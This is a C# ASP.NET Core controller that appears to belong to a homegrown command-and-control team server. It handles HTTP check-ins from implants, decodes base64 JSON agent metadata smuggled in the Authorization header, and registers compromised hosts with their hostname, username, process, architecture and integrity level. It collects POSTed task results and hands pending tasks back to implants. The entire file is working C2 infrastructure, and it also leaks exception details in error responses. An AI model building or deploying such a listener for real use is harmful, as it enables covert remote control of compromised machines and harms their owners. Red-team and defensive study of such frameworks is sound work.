using ApiModels.DTOs.AgentDTOs;

using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using System.Text;

using TeamServer.Application.Services.AgentServices.AgentCore;
using TeamServer.Application.Services.AgentServices.AgentCRUD;
using TeamServer.Domain.Entities.Agents;


namespace TeamServer.Infrastructure.Controllers.ImplantControllers
{
    [ApiController]
    [Route("[controller]")]
    public class HttpImplantController : ControllerBase
    {
        private readonly IAgentCore _agentCore;
        private readonly IAgentCRUD _agentCRUD;

        public HttpImplantController(IAgentCore agentCore, IAgentCRUD agentCRUD)
        {
            _agentCore = agentCore;
            _agentCRUD = agentCRUD;
        }


        private AgentDTO ExtractMetadata(IHeaderDictionary headers)
        {
            if (!headers.TryGetValue("Authorization", out var encodedMetadata))
                return null;

            var token = encodedMetadata.ToString();
            if (token.StartsWith("Bearer "))
                token = token.Substring(7);

            try 
            {
                var json = Encoding.UTF8.GetString(Convert.FromBase64String(token));

                return JsonConvert.DeserializeObject<AgentDTO>(json);
            }
            catch
            {
                return null;
            }
        }

        [HttpGet, HttpPost]
        public async Task<IActionResult> HandleImplant()
        {
            try
            {
                var ping = ExtractMetadata(HttpContext.Request.Headers);
                if (ping == null) return NotFound();
                if (ping.MetadataDTO == null) return BadRequest("Missing or corrupted metadata");

                var metadata = new AgentMetadata
                {
                    Hostname = ping.MetadataDTO.Hostname,
                    Username = ping.MetadataDTO.Username,
                    ProcessName = ping.MetadataDTO.ProcessName,
                    ProcessId = ping.MetadataDTO.ProcessId,
                    Architecture = ping.MetadataDTO.Architecture,
                    Integrity = ping.MetadataDTO.Integrity
                };

                var agent = await _agentCRUD.GetAgentByUniqueIdAsync(ping.UniqueId);

                if (agent == null)
                {
                    agent = new Agent(ping.UniqueId, metadata);
                    await _agentCRUD.AddAgentAsync(agent);
                }
                agent.CheckIn();

                if (HttpContext.Request.Method == "POST")
                {
                    string json;

                    using ( var sr = new StreamReader(HttpContext.Request.Body))
                    {
                        json = await sr.ReadToEndAsync();
                    }

                    var result = JsonConvert.DeserializeObject<IEnumerable<AgentTaskResult>>(json);
                    await _agentCore.AddTaskResult(result);
                }

                var tasks = await _agentCore.GetPendingTask();
                return Ok(tasks ?? Array.Empty<AgentTask>());
            }
            catch (Exception ex)
            {

                return StatusCode(500, ex.ToString());
            }
        }
    }
}
